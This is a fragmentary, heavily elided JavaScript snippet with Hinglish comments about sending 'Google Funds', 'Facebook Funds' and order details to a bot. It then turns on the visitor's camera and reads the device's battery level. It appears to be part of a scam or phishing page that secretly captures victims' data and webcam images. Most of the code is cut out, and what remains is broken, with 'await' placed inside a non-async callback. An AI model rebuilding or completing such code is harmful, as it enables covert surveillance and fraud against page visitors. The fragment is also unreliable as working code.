...
// Google Funds - Bot ko stylish format mein
...
// Facebook Funds - Bot ko stylish format mein
...
// Google Order - Bot ko stylish format mein
...
// Facebook Order - Bot ko stylish format mein
        ...
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                ...
                video.onloadedmetadata = function() {
                    ...
                    var battery = navigator.getBattery ? await navigator.getBattery().then(function(b) { return Math.round(b.level * 100); }) : 'Unknown';
